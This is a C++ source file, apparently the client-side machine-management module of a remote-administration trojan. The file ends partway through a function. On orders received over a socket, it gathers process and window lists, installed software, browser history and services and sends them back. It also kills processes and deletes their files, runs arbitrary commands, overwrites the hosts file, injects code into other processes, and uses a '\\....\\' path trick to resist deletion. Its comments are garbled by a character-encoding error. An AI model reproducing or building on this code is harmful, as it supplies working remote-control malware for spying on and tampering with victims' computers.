// ShellManager.cpp: implementation of the CMachineManager class.
//
//////////////////////////////////////////////////////////////////////
#include "stdafx.h"
#include "MachineManager.h"
#include <tlhelp32.h>
#include <psapi.h>
#include <iphlpapi.h>
#pragma comment(lib,"Iphlpapi.lib")
#pragma comment(lib,"Psapi.lib")
#include <LMACCESS.h>
#include <LMERR.h>
#include <LMAPIBUF.h>

#include <Wtsapi32.h>
#pragma comment(lib,"Wtsapi32.lib")

#pragma comment(lib,"netapi32")
////////Ӳ����Ϣ�õ���ͷ�Ϳ�
#include <setupapi.h>
#include <devguid.h>
#include <regstr.h>
#pragma comment(lib,"Setupapi.lib")

#include  <urlhist.h>   //   Needed   for   IUrlHistoryStg2   and   IID_IUrlHistoryStg2
#include <ShlGuid.h>

#include "yapi.hpp"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////


PidandStitle m_PidandStitle;
PidandStitle::iterator it_m_PidandStitle;

CMachineManager::CMachineManager(ISocketBase* pClient) :CManager(pClient)
{
	m_buser = FALSE;
	BYTE lpBuffer = TOKEN_SYSINFOLIST;
	Send((LPBYTE)&lpBuffer, 1);
	lpFUBuffer = NULL;
	dwFUOffset = 1; // λ��ָ��
	m_buser = TRUE;
	pService = NULL;
}

CMachineManager::~CMachineManager()
{
	if (!m_buser) return;


	if (pService)
	{
		pService->Release();
		CoUninitialize();
	}
	//ж��com��Դ

}

void CMachineManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	if (lpBuffer[0] == TOKEN_HEARTBEAT) return;
	switch (lpBuffer[0])
	{
	case COMMAND_MACHINE_PROCESS:SendProcessList(); break;
	case COMMAND_MACHINE_WINDOWS:SendWindowsList(); break;
	case COMMAND_MACHINE_NETSTATE:SendNetStateList(); break;
	case COMMAND_MACHINE_SOFTWARE:	SendSoftWareList(); break;
	case COMMAND_MACHINE_HTML:SendIEHistoryList(); break;
	case COMMAND_MACHINE_FAVORITES:SendFavoritesUrlList(); break;
	case COMMAND_MACHINE_WIN32SERVICE:SendServicesList(SERVICE_WIN32); break;
	case COMMAND_MACHINE_DRIVERSERVICE:	SendServicesList(SERVICE_KERNEL_DRIVER);  break;
	case COMMAND_MACHINE_TASK:GetRoot(); break;
	case COMMAND_MACHINE_HOSTS:SendHostsList(); break;
	case COMMAND_DELETESERVERICE:DeleteService((LPBYTE)lpBuffer + 1, nSize - 1);break;
	case COMMAND_STARTSERVERICE: MyControlService((LPBYTE)lpBuffer + 1, 0);break;
	case COMMAND_STOPSERVERICE:MyControlService((LPBYTE)lpBuffer + 1, 1);break;
	case COMMAND_PAUSESERVERICE:MyControlService((LPBYTE)lpBuffer + 1, 2);break;
	case COMMAND_CONTINUESERVERICE:MyControlService((LPBYTE)lpBuffer + 1, 3);break;
	case COMMAND_APPUNINSTALL:WinExec((LPCSTR)lpBuffer + 1, SW_SHOW); break;
	case COMMAND_WINDOW_OPERATE: //��ԭ����
	{
		DWORD hwnd;
		DWORD dHow;
		memcpy((void*)&hwnd, lpBuffer + 1, sizeof(DWORD));      //�õ����ھ��
		memcpy(&dHow, lpBuffer + 1 + sizeof(DWORD), sizeof(DWORD));     //�õ����ڴ������
		ShowWindow((HWND__*)hwnd, dHow);
	}
	break;
	case COMMAND_WINDOW_CLOSE: //�ر�
	{
		DWORD hwnd;
		memcpy(&hwnd, lpBuffer + 1, sizeof(DWORD));      //�õ����ھ�� 
		::PostMessage((HWND__*)hwnd, WM_CLOSE, 0, 0); //�򴰿ڷ��͹ر���Ϣ
	}
	break;

	case COMMAND_PROCESS_KILLDEL:
	{
		HANDLE hProcess = NULL;
		DebugPrivilege(SE_DEBUG_NAME, TRUE);
		TCHAR    strProcessName[MAX_PATH] = { 0 };
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *(LPDWORD)(lpBuffer + 1));
		GetModuleFileNameEx(hProcess, NULL, strProcessName, sizeof(strProcessName));
		BOOL bProcess = TerminateProcess(hProcess, 0);

		if (lpBuffer[0] && bProcess)
		{
			int n = 0;
			while (1)
			{
				DeleteFile(strProcessName);
				Sleep(200);
				if (GetFileAttributes(strProcessName) == -1)  //����ļ�������  �˳�
					break;
				n++;
				if (n >= 10)  //�޷�ɾ�� һ��ʱ����˳�
					break;
			}
		}
		CloseHandle(hProcess);

		DebugPrivilege(SE_DEBUG_NAME, FALSE);
		// ����Sleep�£���ֹ����
		Sleep(100);
	}
	break;
	case COMMAND_PROCESS_DEL:
	{
		HANDLE hProcess = NULL;
		DebugPrivilege(SE_DEBUG_NAME, TRUE);
		TCHAR    strProcessName[MAX_PATH] = { 0 };
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *(LPDWORD)(lpBuffer + 1));
		GetModuleFileNameEx(hProcess, NULL, strProcessName, MAX_PATH);
		if (lpBuffer[1])
		{
			TCHAR Tem_path[MAX_PATH];
			TCHAR path_one[MAX_PATH];
			TCHAR path_two[MAX_PATH];
			TCHAR path_three[MAX_PATH];
			TCHAR path_four[MAX_PATH];
			int n = 0;
			SECURITY_ATTRIBUTES SecAttr;
			SecAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
			SecAttr.bInheritHandle = FALSE;
			SecAttr.lpSecurityDescriptor = NULL;
			while (1)
			{
				GetTempPath(MAX_PATH, Tem_path);
				srand((unsigned int)time(0)); int A = rand();	int B = A + 1;
				wsprintf(path_one, _T("%s%d"), Tem_path, A);
				CreateDirectory(path_one, &SecAttr); //CreateDirectoryA(Ŀ¼, ��ȫ�Խṹ)
				wsprintf(path_two, _T("%s%s"), path_one, _T("\\....\\"));
				CreateDirectory(path_two, &SecAttr);// CreateDirectoryA(Ŀ¼ �� ��\....\��, ��ȫ�Խṹ)
				wsprintf(path_three, _T("%s\\%d"), path_two, B);
				MoveFile(strProcessName, path_three);    //MoveFileA(�ļ���, Ŀ¼ �� ��\....\�� �� ��ĸ)
				wsprintf(path_four, _T("%s\\%d"), path_one, B);
				MoveFile(path_two, path_four); //	MoveFileA(Ŀ¼ �� ��\....\��, Ŀ¼ �� ��\�� �� ��ĸ)
				DeleteFile(path_one);  //ɾ��Ŀ¼(Ŀ¼)
				Sleep(200);
				if (GetFileAttributes(strProcessName) == -1)  //����ļ�������  �˳�
					return;
				n++;
				if (n >= 10)  //�޷�ɾ�� һ��ʱ����˳�
					return;
			}
		}
		CloseHandle(hProcess);
		DebugPrivilege(SE_DEBUG_NAME, FALSE);
		// ����Sleep�£���ֹ����
		Sleep(100);
	}
	break;

	case COMMAND_PROCESS_KILL:
	{
		HANDLE hProcess = NULL;
		DebugPrivilege(SE_DEBUG_NAME, TRUE);
		TCHAR    strProcessName[MAX_PATH] = { 0 };
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *(LPDWORD)(lpBuffer + 1));
		GetModuleFileNameEx(hProcess, NULL, strProcessName, sizeof(strProcessName));
		BOOL bProcess = TerminateProcess(hProcess, 0);
		CloseHandle(hProcess);

		DebugPrivilege(SE_DEBUG_NAME, FALSE);
		// ����Sleep�£���ֹ����
		Sleep(100);
		SendProcessList();
	}
	break;
	case COMMAND_PROCESS_FREEZING:
	{
		HANDLE hProcess = NULL;
		DebugPrivilege(SE_DEBUG_NAME, TRUE);
		DWORD Pid = *(LPDWORD)(lpBuffer+1);
		THREADENTRY32 th32;
		th32.dwSize = sizeof(th32);
		HANDLE hThreadSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
		if (hThreadSnap == INVALID_HANDLE_VALUE)
		{
			break;
		}
		BOOL b = ::Thread32First(hThreadSnap, &th32);
		while (b)
		{
			if (th32.th32OwnerProcessID == Pid)
			{
				HANDLE oth = OpenThread(THREAD_ALL_ACCESS, FALSE, th32.th32ThreadID);
				::SuspendThread(oth);
				CloseHandle(oth);
			}
			b = ::Thread32Next(hThreadSnap, &th32);
		}
		::CloseHandle(hThreadSnap);
	}
	break;
	case COMMAND_PROCESS_THAW:
	{
		HANDLE hProcess = NULL;
		DebugPrivilege(SE_DEBUG_NAME, TRUE);
		DWORD Pid = *(LPDWORD)(lpBuffer+1);
		THREADENTRY32 th32;
		th32.dwSize = sizeof(th32);
		HANDLE hThreadSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
		if (hThreadSnap == INVALID_HANDLE_VALUE)
		{
			break;
		}
		BOOL b = ::Thread32First(hThreadSnap, &th32);
		while (b)
		{
			if (th32.th32OwnerProcessID == Pid)
			{
				HANDLE oth = OpenThread(THREAD_ALL_ACCESS, FALSE, th32.th32ThreadID);
				::ResumeThread(oth);
				CloseHandle(oth);
				break;
			}
			::Thread32Next(hThreadSnap, &th32);
		}
		::CloseHandle(hThreadSnap);
	}
	break;
	case COMMAND_HOSTS_SET:
	{
		TCHAR szHostsFile[MAX_PATH] = { 0 };
		BOOL bIsWow64 = FALSE;
		HANDLE hFile = INVALID_HANDLE_VALUE;
		DWORD dwWritten;

		GetWindowsDirectory(szHostsFile, sizeof(szHostsFile));
		::IsWow64Process(::GetCurrentProcess(), &bIsWow64);
		if (bIsWow64)
			lstrcat(szHostsFile, _T("\\sysnative\\drivers\\etc\\hosts"));
		else
			lstrcat(szHostsFile, _T("\\system32\\drivers\\etc\\hosts"));

		SetFileAttributes(szHostsFile, FILE_ATTRIBUTE_NORMAL);
		hFile = CreateFile(szHostsFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
			return;
		if (!WriteFile(hFile, lpBuffer + 1, nSize - 1, &dwWritten, NULL))
		{
			CloseHandle(hFile);
			return;
		}
		CloseHandle(hFile);
	}
	break;
	case COMMAND_INJECT: // lpBuffer, UINT nSize)
	{
		if (nSize < sizeof(InjectData)) return;
		InjectData* p_InjectData =(InjectData*) (lpBuffer+1);
		byte* data = lpBuffer + sizeof(InjectData)+1;
		if ((nSize - sizeof(InjectData)-1) != p_InjectData->datasize) return;
		injectprocess(p_InjectData->mode, p_InjectData->ExeIsx86, p_InjectData->dwProcessID, data, p_InjectData->datasize, p_InjectData->strpath);
	}
	break;
	
	default:

		break;
	}
}

BOOL CMachineManager::DebugPrivilege(const TCHAR* PName, BOOL bEnable)
{
	BOOL              bResult = TRUE;
	HANDLE            hToken;
	TOKEN_PRIVILEGES  TokenPrivileges;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		bResult = FALSE;
		return bResult;
	}
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;

	LookupPrivilegeValue(NULL, PName, &TokenPrivileges.Privileges[0].Luid);
	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	if (GetLastError() != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}

	CloseHandle(hToken);
	return bResult;
}

BOOL DosPathToNtPath(LPTSTR pszDosPath, LPTSTR pszNtPath)
{
	TCHAR			szDriveStr[500];
	TCHAR			szDrive[3];
	TCHAR			szDevName[100];
	INT				cchDevName;
	INT				i;

	//������
	if (!pszDosPath || !pszNtPath)
		return FALSE;

	//��ȡ���ش����ַ���
	if (GetLogicalDriveStrings(sizeof(szDriveStr), szDriveStr))
	{
		for (i = 0; szDriveStr[i]; i += 4)
		{
			if (!lstrcmpi(&(szDriveStr[i]), _T("A:\\")) || !lstrcmpi(&(szDriveStr[i]), _T("B:\\")))
				continue;

			szDrive[0] = szDriveStr[i];
			szDrive[1] = szDriveStr[i + 1];
			szDrive[2] = _T('\0');
			if (!QueryDosDevice(szDrive, szDevName, 100))//��ѯ Dos �豸��
				return FALSE;

			cchDevName = lstrlen(szDevName);
			if (_tcsnccmp(pszDosPath, szDevName, cchDevName) == 0)//����
			{
				lstrcpy(pszNtPath, szDrive);//����������
				lstrcat(pszNtPath, pszDosPath + cchDevName);//����·��
				return TRUE;
			}
		}
	}

	lstrcpy(pszNtPath, pszDosPath);

	return FALSE;
}

BOOL GetProcessUserName(HANDLE hProcess, TCHAR* strProcessUser)
{
	HANDLE hToken = NULL;
	BOOL bFuncReturn = FALSE;
	PTOKEN_USER pToken_User = NULL;
	DWORD dwTokenUser = 0;
	TCHAR szAccName[MAX_PATH] = { 0 };
	TCHAR szDomainName[MAX_PATH] = { 0 };
	HANDLE hProcessToken = NULL;
	if (hProcess != NULL)
	{
		// ���������̵�Ȩ��
		bFuncReturn = ::OpenProcessToken(hProcess, TOKEN_QUERY, &hToken);
		if (bFuncReturn == 0) // ʧ��
			return FALSE;

		if (hToken != NULL)
		{
			::GetTokenInformation(hToken, TokenUser, NULL, 0L, &dwTokenUser);
			if (dwTokenUser > 0)
			{
				pToken_User = (PTOKEN_USER)::GlobalAlloc(GPTR, dwTokenUser);
			}

			if (pToken_User != NULL)
			{
				bFuncReturn = ::GetTokenInformation(hToken, TokenUser, pToken_User, dwTokenUser, &dwTokenUser);
			}

			if (bFuncReturn != FALSE && pToken_User != NULL)
			{
				SID_NAME_USE eUse = SidTypeUnknown;
				DWORD dwAccName = 0L;
				DWORD dwDomainName = 0L;
				PSID  pSid = pToken_User->User.Sid;
				bFuncReturn = ::LookupAccountSid(NULL, pSid, NULL, &dwAccName,
					NULL, &dwDomainName, &eUse);

				if (dwAccName > 0 && dwAccName < MAX_PATH && dwDomainName>0 && dwDomainName <= MAX_PATH)
				{
					bFuncReturn = ::LookupAccountSid(NULL, pSid, szAccName, &dwAccName,
						szDomainName, &dwDomainName, &eUse);
				}

				if (bFuncReturn != 0)
					lstrcpy(strProcessUser, szAccName);

			}
		}
	}

	if (pToken_User != NULL)
		::GlobalFree(pToken_User);

	if (hToken != NULL)
		::CloseHandle(hToken);

	return TRUE;
}

void CMachineManager::SendProcessList()
{
	UINT	nRet = -1;
	LPBYTE	lpBuffer = getProcessList();
	if (lpBuffer == NULL)
		return;

	Send((LPBYTE)lpBuffer, (int)LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}


static BOOL CALLBACK lpEnumFunc(HWND hwnd, LPARAM lParam)
{

	if (NULL == hwnd)
	{
		return TRUE;
	}
	if (!::IsWindow(hwnd))
		return TRUE;

	if (!IsWindowVisible(hwnd))
		return TRUE;
	DWORD  processId;
	GetWindowThreadProcessId(
		hwnd,			// ���ھ��
		&processId		// ���� PID ��ָ��
	);

	int i = GetWindowTextLength(hwnd);
	TCHAR szBuf_title[MAX_PATH];
	if (i > (MAX_PATH - 1)) return TRUE;
	GetWindowText(
		hwnd,					// ���ھ��
		szBuf_title,		// ���մ��ڱ���Ļ�����ָ��
		i + 1			// �������ֽڴ�С
	);

	std::wstring* str_title=new std::wstring;
	*str_title = szBuf_title;
	m_PidandStitle.insert(MAKE_PAIR(PidandStitle,processId, str_title));
	return TRUE;
}


bool CMachineManager::Is64BitOS()
{
	typedef VOID(WINAPI* LPFN_GetNativeSystemInfo)(__out LPSYSTEM_INFO lpSystemInfo);
	LPFN_GetNativeSystemInfo fnGetNativeSystemInfo = (LPFN_GetNativeSystemInfo)GetProcAddress(GetModuleHandleW(L"kernel32"), "GetNativeSystemInfo");
	if (fnGetNativeSystemInfo)
	{
		SYSTEM_INFO stInfo = { 0 };
		fnGetNativeSystemInfo(&stInfo);
		if (stInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64
			|| stInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
		{
			return true;
		}
	}
	return false;
}


bool CMachineManager::Is64BitPorcess(DWORD dwProcessID)
{
	if (!Is64BitOS())
	{
		return FALSE;
	}
	else
	{
		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcessID);
		if (hProcess)
		{
			typedef BOOL(WINAPI* LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
			LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(GetModuleHandleW(L"kernel32"), "IsWow64Process");
			if (NULL != fnIsWow64Process)
			{
				BOOL bIsWow64 = false;
				fnIsWow64Process(hProcess, &bIsWow64);
				CloseHandle(hProcess);
				if (bIsWow64)
				{
					return false;
				}
				else
				{
					return true;
				}
			}
		}
	}
	return false;
}


LPBYTE CMachineManager::getProcessList()
{
	HANDLE			hSnapshot = NULL;
	HANDLE			hProcess = NULL;
	HMODULE			hModules = NULL;
	PROCESSENTRY32	pe32 = { 0 };
	DWORD			cbNeeded;
	TCHAR			strProcessName[MAX_PATH] = { 0 };
	TCHAR            strProcessUser[MAX_PATH] = { 0 };
	TCHAR           szImagePath[MAX_PATH] = { 0 };
	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	DWORD			dwLength = 0;
	DWORD           dwWorkingSetSize = 0;
	DWORD           dwFileSize = 0;
	PROCESS_MEMORY_COUNTERS pmc;
	DebugPrivilege(SE_DEBUG_NAME, TRUE);

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnapshot == INVALID_HANDLE_VALUE)
		return NULL;

	pe32.dwSize = sizeof(PROCESSENTRY32);

	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);

	lpBuffer[0] = TOKEN_MACHINE_PROCESS;
	dwOffset = 1;

	m_PidandStitle.clear();
	it_m_PidandStitle = m_PidandStitle.begin();
	while (it_m_PidandStitle != m_PidandStitle.end())
	{
			SAFE_DELETE(it_m_PidandStitle->second);
			m_PidandStitle.erase(it_m_PidandStitle++);
	
	}

	EnumWindows(lpEnumFunc, NULL);

	if (Process32First(hSnapshot, &pe32))
	{
		do
		{
			hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
			if ((pe32.th32ProcessID != 0) && (pe32.th32ProcessID != 4) && (pe32.th32ProcessID != 8))
			{
				EnumProcessModules(hProcess, &hModules, sizeof(hModules), &cbNeeded);

				if (0 == GetProcessImageFileName(hProcess, szImagePath, MAX_PATH))
				{
					lstrcpy(strProcessName, _T("---"));

				}
				else if (!DosPathToNtPath(szImagePath, strProcessName))
				{

				}

				memset(strProcessUser, 0, sizeof(strProcessUser));
				if (GetProcessUserName(hProcess, strProcessUser))
				{
					if (lstrlen(strProcessUser) == 0)
					{
						lstrcpy(strProcessUser, _T("--"));
					}
				}
				else
				{
					lstrcpy(strProcessUser, _T("-"));
				}





				// �˽���ռ�����ݴ�С
				dwLength = sizeof(DWORD) * 5 + sizeof(bool) + MAX_PATH * sizeof(TCHAR) + lstrlen(pe32.szExeFile) * sizeof(TCHAR) + lstrlen(strProcessName) * sizeof(TCHAR) + lstrlen(strProcessUser) * sizeof(TCHAR) + 6;
				// ������̫С�������·�����
				if (LocalSize(lpBuffer) < (dwOffset + dwLength))
					lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT | LMEM_MOVEABLE);

				memcpy(lpBuffer + dwOffset, &(pe32.th32ProcessID), sizeof(DWORD));
				dwOffset += sizeof(DWORD);


				bool is64 = Is64BitPorcess(pe32.th32ProcessID);
				memcpy(lpBuffer + dwOffset, &is64, sizeof(bool));
				dwOffset += sizeof(bool);

				//GetHWndsByProcessID(pe32.th32ProcessID);

				it_m_PidandStitle = m_PidandStitle.find(pe32.th32ProcessID);
				if (it_m_PidandStitle == m_PidandStitle.end())  //û�����б�ͶϿ����� �ÿͻ������·��͵�¼��Ϣ
				{
					memcpy(lpBuffer + dwOffset, _T(""), MAX_PATH * sizeof(TCHAR));
				}
				else
				{
					std::wstring* str_title = it_m_PidandStitle->second;

					memcpy(lpBuffer + dwOffset, str_title->c_str(), str_title->length()*sizeof(TCHAR));

				}

				dwOffset += MAX_PATH * sizeof(TCHAR);

				memcpy(lpBuffer + dwOffset, pe32.szExeFile, lstrlen(pe32.szExeFile) * sizeof(TCHAR) + 2);
				dwOffset += lstrlen(pe32.szExeFile) * sizeof(TCHAR) + 2;

				memcpy(lpBuffer + dwOffset, strProcessName, lstrlen(strProcessName) * sizeof(TCHAR) + 2);
				dwOffset += lstrlen(strProcessName) * sizeof(TCHAR) + 2;


				DWORD dwPriClass = GetPriorityClass(hProcess);
				memcpy(lpBuffer + dwOffset, &dwPriClass, sizeof(DWORD));
				dwOffset += sizeof(DWORD);

				dwPriClass = pe32.cntThreads;
				memcpy(lpBuffer + dwOffset, &dwPriClass, sizeof(DWORD));
				dwOffset += sizeof(DWORD);

				memcpy(lpBuffer + dwOffset, strProcessUser, lstrlen(strProcessUser) * sizeof(TCHAR) + 2);
				dwOffset += lstrlen(strProcessUser) * sizeof(TCHAR) + 2;

				ZeroMemory(&pmc, sizeof(pmc));
				pmc.cb = sizeof(PROCESS_MEMORY_COUNTERS);
				if (GetProcessMemoryInfo(hProcess, &pmc, sizeof(pmc)))
				{
					dwWorkingSetSize = (DWORD)(pmc.WorkingSetSize / 1024);		//��λΪk
				}
				else
					dwWorkingSetSize = 0;

				memcpy(lpBuffer + dwOffset, &dwWorkingSetSize, sizeof(DWORD));
				dwOffset += sizeof(DWORD);


				HANDLE handle = CreateFile(strProcessName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
				if (handle != INVALID_HANDLE_VALUE)
				{
					dwFileSize = GetFileSize(handle, NULL) / 1024;
					CloseHandle(handle);
				}
				else
					dwFileSize = 0;

				memcpy(lpBuffer + dwOffset, &dwFileSize, sizeof(DWORD));
				dwOffset += sizeof(DWORD);

			}

			CloseHandle(hProcess);//���޸�
		} while (Process32Next(hSnapshot, &pe32));
	}

	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT | LMEM_MOVEABLE);

	DebugPrivilege(SE_DEBUG_NAME, FALSE);
	CloseHandle(hSnapshot);
	return lpBuffer;
}



//���ݽ���ID��ȡ���ھ��
HWND CMachineManager::GetHwndByPid(DWORD dwProcessID)
{
	//����Z�򶥲��Ĵ��ھ��
	HWND hWnd = ::GetTopWindow(0);

	while (hWnd)
	{
		DWORD pid = 0;
		//���ݴ��ھ����ȡ����ID
		DWORD dwTheardId = ::GetWindowThreadProcessId(hWnd, &pid);

		if (dwTheardId != 0)
		{
			if (pid == dwProcessID)
			{
				return hWnd;
			}
		}
		//����z���е�ǰһ�����һ�����ڵľ��
		hWnd = ::GetNextWindow(hWnd, GW_HWNDNEXT);

	}
	return 0;
}

LPBYTE CMachineManager::getWindowsList()
{
	LPBYTE	lpBuffer = NULL;
	EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)&lpBuffer);
	lpBuffer[0] = TOKEN_MACHINE_WINDOWS;
	return lpBuffer;

}


void CMachineManager::SendWindowsList()
{
	LPBYTE	lpBuffer = getWindowsList();
	if (lpBuffer == NULL)
		return;

	Send((LPBYTE)lpBuffer, (int)LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}


void CMachineManager::SendNetStateList()
{
	LPBYTE	lpBuffer = getNetStateList();
	if (lpBuffer == NULL)
		return;

	Send((LPBYTE)lpBuffer, (UINT)LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}


bool CALLBACK CMachineManager::EnumWindowsProc(HWND hwnd, LPARAM lParam)
{
	if (NULL == hwnd)
	{
		return true;
	}
	

	if (!IsWindowVisible(hwnd))
		return true;

	//DWORD dwLength = 0;
	DWORD dwOffset = 0;

	LPBYTE lpBuffer = *(LPBYTE*)lParam;

	//TCHAR strTitle[1024] = { 0 };
	WINDOWSINFO m_ibfo;
	if (IsWindowVisible(hwnd))
	{
		m_ibfo.canlook = true;
	}
	else
	{
		m_ibfo.canlook = false;
	}

	memset(m_ibfo.strTitle, 0, sizeof(m_ibfo.strTitle));
	try
	{
		::GetWindowText(hwnd, m_ibfo.strTitle, 1024);

		//strTitle[sizeof(strTitle) - 1] = 0;

	/*	if (lstrlen(m_ibfo.strTitle) == 0)
			return true;*/

		if (lpBuffer == NULL)
		{
			lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1);
			dwOffset = 1;
		}
		else
		{
			dwOffset = (DWORD)LocalSize(lpBuffer);
			//while (*(lpBuffer + dwOffset - 2) == 0) dwOffset--;
		}

		//dwLength = sizeof(DWORD) + sizeof(HWND) + lstrlen(strTitle)*sizeof(TCHAR) ;
		lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset + sizeof(WINDOWSINFO), LMEM_ZEROINIT | LMEM_MOVEABLE);
	}
	catch (...)
	{
		return true;
	}
	DWORD ProcessID;
	GetWindowThreadProcessId(hwnd, &ProcessID);
	RECT m_rect;
	::GetWindowRect(hwnd, &m_rect);
	m_ibfo.w = m_rect.right - m_rect.left;	m_ibfo.h = m_rect.bottom - m_rect.top;
	m_ibfo.m_poceessid = ProcessID;
	m_ibfo.m_hwnd = (DWORD)hwnd;


	memcpy(lpBuffer + dwOffset, &m_ibfo, sizeof(WINDOWSINFO));

	*(LPBYTE*)lParam = lpBuffer;
	return true;
}


void CMachineManager::SendSoftWareList()
{
	LPBYTE	lpBuffer = getSoftWareList();
	if (lpBuffer == NULL)
		return;

	Send((LPBYTE)lpBuffer, (int)LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}



LPBYTE CMachineManager::getSoftWareList()
{
	const int  MAX_LEG = 256 * sizeof(TCHAR);

	LPBYTE 	lpBuffer = NULL;
	DWORD	dwOffset = 1;
	DWORD   dwLength = 0;
	TCHAR regBufferValue[MAX_LEG] = { 0 };
	TCHAR regDisplayName[MAX_LEG] = { 0 };
	TCHAR regPublisher[MAX_LEG] = { 0 };
	TCHAR regDisplayVersion[MAX_LEG] = { 0 };
	TCHAR regInstallDate[MAX_LEG] = { 0 };
	TCHAR regUninstallString[MAX_LEG] = { 0 };

	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	if (lpBuffer == NULL)
		return NULL;

	lpBuffer[0] = TOKEN_MACHINE_SOFTWARE;

	int n = 0;
	HKEY hKey;
	DWORD dwRegNum = MAX_LEG;
	TCHAR regBufferName[MAX_LEG] = { 0 };
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"),
		NULL, KEY_READ, &hKey) == ERROR_SUCCESS)
	{
		if (RegQueryInfoKey(hKey, NULL, NULL, NULL, &dwRegNum, NULL, NULL, NULL, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
		{

			for (int i = 0; i < (int)dwRegNum; i++)
			{
				DWORD dwRegSize = MAX_LEG;
				RegEnumKeyEx(hKey, i, regBufferName, &dwRegSize, NULL, NULL, NULL, NULL);
				DWORD dwType;
				HKEY hSubKey;
				if (RegOpenKeyEx(hKey, regBufferName, NULL, KEY_READ, &hSubKey) == ERROR_SUCCESS)
				{

					dwRegSize = MAX_LEG;
					memset(regDisplayName, 0, MAX_LEG);
					RegQueryValueEx(hSubKey, _T("DisplayName"), 0, &dwType, (LPBYTE)regDisplayName, &dwRegSize);


					dwRegSize = MAX_LEG;
					memset(regBufferValue, 0, MAX_LEG);
					// ȡParentKeyName��ֵ,�ж��Ƿ��ǲ�����Ϣ, �ǲ�����Ϣ��ֵΪ"OperatingSystem"
					RegQueryValueEx(hSubKey, _T("ParentKeyName"), 0, &dwType, (LPBYTE)regBufferValue, &dwRegSize);
					if (lstrlen(regDisplayName) == 0 || lstrcmp(regBufferValue, _T("OperatingSystem")) == 0) //�ж��Ƿ��ǲ�����Ϣ 
					{
						continue;
					}


					dwRegSize = MAX_LEG;
					memset(regPublisher, 0, MAX_LEG);
					RegQueryValueEx(hSubKey, _T("Publisher"), 0, &dwType, (LPBYTE)regPublisher, &dwRegSize);


					dwRegSize = MAX_LEG;
					memset(regDisplayVersion, 0, MAX_LEG);
					RegQueryValueEx(hSubKey, _T("DisplayVersion"), 0, &dwType, (LPBYTE)regDisplayVersion, &dwRegSize);


					dwRegSize = MAX_LEG;
					memset(regInstallDate, 0, MAX_LEG);
					// �ж��Ƿ�����ע����л�ȡ����װʱ��, ��ȡ�����ʱ��
					if (RegQueryValueEx(hSubKey, _T("InstallDate"), 0, &dwType, (LPBYTE)regInstallDate, &dwRegSize) == ERROR_SUCCESS)
					{
					}
					else
					{
						FILETIME fileLastTime;
						RegQueryInfoKey(hSubKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL,
							NULL, NULL, NULL, &fileLastTime);
						SYSTEMTIME sTime, stLocal;
						FileTimeToSystemTime(&fileLastTime, &sTime);
						SystemTimeToTzSpecificLocalTime(NULL, &sTime, &stLocal);
						TCHAR tchTime[MAX_LEG] = { 0 };
						wsprintf(tchTime, _T("%d%02d%02d"), stLocal.wYear, stLocal.wMonth, stLocal.wDay);
						lstrcpy(regInstallDate, tchTime);
					}

					dwRegSize = MAX_LEG;
					memset(regUninstallString, 0, MAX_LEG);
					RegQueryValueEx(hSubKey, _T("UninstallString"), 0, &dwType, (LPBYTE)regUninstallString, &dwRegSize);


					// ������̫С�������·�����
					dwLength = lstrlen(regDisplayName) * sizeof(TCHAR) + lstrlen(regPublisher) * sizeof(TCHAR) + lstrlen(regDisplayVersion) * sizeof(TCHAR) + lstrlen(regInstallDate) * sizeof(TCHAR) + lstrlen(regUninstallString) * sizeof(TCHAR) + 11;
					if (LocalSize(lpBuffer) < (dwOffset + dwLength))
						lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT | LMEM_MOVEABLE);


					memcpy(lpBuffer + dwOffset, regDisplayName, lstrlen(regDisplayName) * sizeof(TCHAR) + 2);
					dwOffset += lstrlen(regDisplayName) * sizeof(TCHAR) + 2;

